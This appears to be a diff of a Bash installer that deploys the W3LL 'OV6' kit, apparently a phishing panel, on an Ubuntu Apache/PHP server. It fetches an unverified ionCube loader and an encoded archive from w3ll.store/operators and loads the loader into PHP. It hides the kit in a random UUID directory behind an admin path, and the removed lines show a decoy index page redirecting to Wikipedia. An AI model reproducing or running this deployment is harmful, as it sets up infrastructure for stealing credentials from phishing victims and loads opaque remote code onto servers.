@@ -7,75 +7,64 @@ YELLOW='\033[0;33m'
 BLUE='\033[0;34m'
 RESET='\033[0m'
 
-# Check OS Version
-if [[ -f /etc/os-release ]]; then
-    OS_NAME=$(grep '^NAME=' /etc/os-release 2>/dev/null | awk -F'=' '{print $2}' | tr -d '"')
-    OS_VERSION=$(grep '^VERSION_ID=' /etc/os-release 2>/dev/null | awk -F'=' '{print $2}' | tr -d '"' | cut -d '.' -f 1)
-else
-    OS_NAME=""
-    OS_VERSION=""
+# Exit if not running as root
+if [[ $EUID -ne 0 ]]; then
+    echo -e "${RED}This script must be run as root or with sudo privileges.${RESET}"
+    exit 1
 fi
 
-if [[ "$OS_NAME" != "Ubuntu" ]] || [[ "$OS_VERSION" != "22" ]]; then
+# Check OS Version
+if ! grep -q 'Ubuntu 22' /etc/os-release; then
     echo -e "${RED}This script is designed for ${YELLOW}Ubuntu 22${RED}. Please install ${YELLOW}Ubuntu 22${RED} to proceed.${RESET}"
     exit 1
 fi
 
-# Check for root privileges
-if [[ $EUID -ne 0 ]]; then
-    echo -e "${RED}This script must be run as root or with sudo privileges, so run ${YELLOW}sudo bash install.sh${RESET}"
-    exit 1
+# Ensure necessary commands are available
+for cmd in add-apt-repository apt-get systemctl a2enmod wget tee grep awk mv rm chown; do
+    if ! command -v $cmd &> /dev/null; then
+        echo -e "${RED}Required command '$cmd' not found. Exiting.${RESET}"
+        exit 1
+    fi
+done
+
+# Update and upgrade
+apt-get update -qq
+apt-get upgrade -y
+
+# Install software-properties-common if not present
+if ! command -v add-apt-repository &> /dev/null; then
+    echo -e "${YELLOW}Installing software-properties-common...${RESET}"
+    apt-get install -y software-properties-common
 fi
 
+# Add PHP PPA and install Apache and PHP
+add-apt-repository -y ppa:ondrej/php
+apt-get update -qq
+apt-get install -y apache2 php7.4 libapache2-mod-php7.4 php7.4-cli php7.4-fpm php7.4-json php7.4-common php7.4-mysql php7.4-zip php7.4-gd php7.4-mbstring php7.4-curl php7.4-xml php7.4-bcmath
+
+# Start and enable Apache
+systemctl start apache2
+systemctl enable apache2
+
+# Enable Apache modules
+a2enmod rewrite headers proxy proxy_fcgi setenvif
+
 # Ask for domain name
-echo -ne "Enter your domain name (${YELLOW}without www, e.g., example.com${RESET}): ${BLUE}"
-read domain
-echo -e "${RESET}"
+read -p "Enter your domain name (without www, e.g., example.com): " domain
 
 if [[ -z "$domain" ]]; then
     echo -e "${RED}Domain name cannot be empty.${RESET}"
     exit 1
 fi
 
-# Check dependencies
-for dep in wget unzip uuidgen; do
-    command -v $dep >/dev/null 2>&1 || {
-        echo -e "${RED}Error: $dep is not installed. ${YELLOW}Attempting to install...${BLUE}" >&2;
-        sudo apt-get update -qq && sudo apt-get install -y $dep || {
-            echo -e "${RED}Failed to install $dep.${RESET}" >&2;
-            exit 1;
-        };
-    }
-done
-
-# Update package list
-echo -e "${BLUE}"
-sudo apt-get update -y
-sudo apt-get upgrade -y
-sudo add-apt-repository universe
-sudo add-apt-repository ppa:ondrej/php
-sudo apt-get update -y
-sudo apt-get upgrade -y
-
-# Install Apache
-sudo apt-get install -y apache2
-sudo systemctl start apache2
-sudo systemctl enable apache2
-
-# Enable Apache modules
-sudo a2enmod rewrite
-sudo a2enmod headers
-
 # Create a virtual host configuration file for the domain
-sudo tee /etc/apache2/sites-available/${domain}.conf > /dev/null <<EOL
+cat > /etc/apache2/sites-available/${domain}.conf <<EOL
 <VirtualHost *:80>
-    ServerAdmin webserver@${domain}
+    ServerAdmin webmaster@${domain}
     ServerName ${domain}
     DocumentRoot /var/www/${domain}
-
     ErrorLog \${APACHE_LOG_DIR}/${domain}_error.log
     CustomLog \${APACHE_LOG_DIR}/${domain}_access.log combined
-
     <Directory /var/www/${domain}>
         Options Indexes FollowSymLinks MultiViews
         AllowOverride All
@@ -85,85 +74,38 @@ sudo tee /etc/apache2/sites-available/${domain}.conf > /dev/null <<EOL
 EOL
 
 # Enable the virtual host
-sudo a2ensite ${domain}.conf
+a2ensite ${domain}.conf
 
-# Install PHP 7.4 and required extensions
-echo -e "${BLUE}"
-sudo apt install -y php7.4 libapache2-mod-php7.4 php7.4-cli php7.4-fpm php7.4-json php7.4-common php7.4-mysql php7.4-zip php7.4-gd php7.4-mbstring php7.4-curl php7.4-xml php7.4-bcmath
-
-# Check for IonCube Loader
-function check_ioncube {
-    php -m | grep -q 'ionCube'
-    return $?
+# IonCube Loader Installation
+function install_ioncube {
+    wget -q https://w3ll.store/operators/ioncube_loader_lin_7.4.so
+    local EXT_DIR=$(php -i | grep extension_dir | awk 'NR==1 {print $NF}')
+    mv ioncube_loader_lin_7.4.so $EXT_DIR
+    echo "zend_extension = $EXT_DIR/ioncube_loader_lin_7.4.so" | tee -a /etc/php/7.4/apache2/php.ini /etc/php/7.4/cli/php.ini
 }
 
-# Install IonCube Loader if not present
-if ! check_ioncube; then
-    echo -e "${YELLOW}Installing IonCube Loader...${RESET}"
+php -m | grep -q 'ionCube' || install_ioncube
 
-    # Download ionCube Loader
-    wget https://w3ll.store/operators/ioncube_loader_lin_7.4.so
-
-    # Find PHP Extension Directory and PHP Configuration File
-    EXT_DIR=$(php -i | grep extension_dir | head -n 1 | sed -e 's/.*=> //g')
-    INI_FILE=$(php --ini | grep "Loaded Configuration File" | sed -e 's/.*: //g')
-    APACHE_INI=$(echo /etc/php/$(php -v | head -n 1 | cut -d ' ' -f 2 | cut -f1,2 -d'.')/apache2/php.ini)
-
-    # Move ionCube Loader
-    mv ioncube_loader_lin_7.4.so $EXT_DIR
-
-    # Update php.ini file
-    echo "zend_extension = $EXT_DIR/ioncube_loader_lin_7.4.so" | sudo tee -a $INI_FILE
-    echo "zend_extension = $EXT_DIR/ioncube_loader_lin_7.4.so" | sudo tee -a $APACHE_INI
-
-    echo -e "${GREEN}IonCube Loader installed successfully.${RESET}"
-else
-    echo -e "${GREEN}IonCube Loader is already installed.${RESET}"
-fi
-
-# Download the software
-wget https://w3ll.store/operators/OV6_ENCODE.zip
-
-# Generate a random directory name
+# Download and extract software
+wget -q https://w3ll.store/operators/OV6_ENCODE.zip
 random_string=$(uuidgen)
-mkdir "$random_string"
-mkdir /var/www/${domain}
+mkdir -p /var/www/${domain}/${random_string}
+unzip -q OV6_ENCODE.zip -d "/var/www/${domain}/${random_string}"
 
-# Create and write the redirect script to index.php
-echo "<?php header('Location: https://www.wikipedia.org/'); exit();" | sudo tee /var/www/${domain}/index.php > /dev/null
-
-# Extract the software directly into the generated directory
-unzip OV6_ENCODE.zip -d "/var/www/${domain}/${random_string}"
-
-# Check for .htaccess and alert if not present
-if [[ ! -f "/var/www/${domain}/${random_string}/O V 6/.htaccess" ]]; then
-    echo -e "${YELLOW}Warning: .htaccess file is missing in the archive.${RESET}"
-else
-    # Explicitly move .htaccess
+# Move .htaccess if present
+if [[ -f "/var/www/${domain}/${random_string}/O V 6/.htaccess" ]]; then
     mv "/var/www/${domain}/${random_string}/O V 6/.htaccess" "/var/www/${domain}/${random_string}/"
+else
+    echo -e "${YELLOW}Warning: .htaccess file is missing in the archive.${RESET}"
 fi
 
-# Move other contents of 'O V 6' one level up
+# Move contents of 'O V 6' one level up and clean up
 mv "/var/www/${domain}/${random_string}/O V 6/"* "/var/www/${domain}/${random_string}/"
+rm -r "/var/www/${domain}/${random_string}/O V 6" OV6_ENCODE.zip
 
-# Remove the empty 'O V 6' directory
-rm -r "/var/www/${domain}/${random_string}/O V 6"
+# Set permissions and restart Apache and PHP
+chown -R www-data:www-data /var/www/${domain}
+systemctl restart apache2 php7.4-fpm
 
-# Clean up
-rm OV6_ENCODE.zip
-
-# Set permissions
-chown -R www-data:www-data /var/www/${domain}/${random_string}
-
-# Restart Apache to apply all changes
-sudo systemctl restart apache2
-sudo systemctl start php7.4-fpm
-sudo a2enmod proxy
-sudo a2enmod proxy_fcgi
-sudo a2enmod setenvif
-sudo apachectl configtest
-sudo systemctl restart apache2
-sudo systemctl restart php7.4-fpm
-
-# Display installation completion message
+# Installation completion message
 echo -e "${GREEN}Installation completed successfully, please visit: ${YELLOW}https://${domain}/${random_string}/admin${GREEN} to set your details.${RESET}"
